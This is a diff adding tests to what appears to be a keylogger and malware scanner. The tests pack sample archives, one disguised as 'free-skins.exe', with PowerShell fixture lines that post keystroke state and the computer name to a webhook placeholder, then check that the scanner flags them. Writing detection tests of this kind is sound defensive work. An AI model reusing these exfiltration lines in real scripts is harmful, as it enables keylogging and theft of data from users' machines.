@@ -170,3 +170,38 @@ def test_one_stray_key_marker_is_not_a_keylogger(scan):
     code = b"for (const k in keys) { delete obj[del]; }\nfetch('https://registry.yarnpkg.com/');\n"
     report = scan("tool.js", code)
     assert not any(f.check.endswith("keylog-text") for f in report.findings)
+
+
+def _needs_7zip():
+    from antiloggingbear.engine import external7z
+    if not external7z.available():
+        pytest.skip("7-Zip not available")
+
+
+def test_self_extracting_7z_is_opened(scan):
+    _needs_7zip()
+    py7zr = pytest.importorskip("py7zr")
+    from samples import make_pe
+    buffer = io.BytesIO()
+    with py7zr.SevenZipFile(buffer, "w") as archive:
+        archive.writestr(f"iwr -Method Post '{WEBHOOK}' -Body (GetAsyncKeyState 13)".encode(), "payload/run.ps1")
+    stub = make_pe({"kernel32.dll": ["ExitProcess", "GetModuleFileNameW", "CreateFileW", "ReadFile"]})
+    report = scan("free-skins.exe", stub + b"\x00" * 512 + buffer.getvalue())
+    assert "installer.opened" in checks(report)
+    assert any(f.path == "free-skins.exe/payload/run.ps1" for f in report.files)
+    assert report.verdict is not Verdict.CLEAN
+
+
+def test_cab_is_opened(scan, tmp_path):
+    _needs_7zip()
+    import shutil
+    import subprocess
+    makecab = shutil.which("makecab")
+    if not makecab:
+        pytest.skip("makecab not available")
+    source = tmp_path / "setup.ps1"
+    source.write_text(f"Invoke-RestMethod -Uri '{WEBHOOK}' -Method Post -Body $env:COMPUTERNAME")
+    subprocess.run([makecab, str(source), str(tmp_path / "pack.cab")], check=True, capture_output=True)
+    report = scan("pack.cab", (tmp_path / "pack.cab").read_bytes())
+    assert any(f.path == "pack.cab/setup.ps1" for f in report.files)
+    assert report.verdict is not Verdict.CLEAN
